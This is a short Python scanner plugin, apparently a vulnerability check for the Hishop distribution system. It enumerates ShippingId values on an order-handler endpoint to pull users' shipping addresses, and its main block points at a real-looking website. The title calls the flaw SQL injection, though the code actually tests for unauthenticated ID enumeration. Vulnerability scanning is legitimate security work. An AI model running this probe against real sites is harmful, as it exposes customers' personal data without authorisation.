#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = Hishop易分销系统SQL注入漏洞
import re

def assign(service, arg):
    if service == "hishop":
        return True, arg

def audit(arg):
    for id in range(1,20):
        payload = 'SubmmitOrderHandler.aspx?Action=GetUserShippingAddress&ShippingId=%s' % id
        target = arg + payload
        code, head,res, errcode, _   = curl.curl2(target) 
        if code == 200 and 'Address' in res and 'Status' in res:
            security_hole(target)
            break
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('hishop', 'http://www.eme.com.cn/')[1])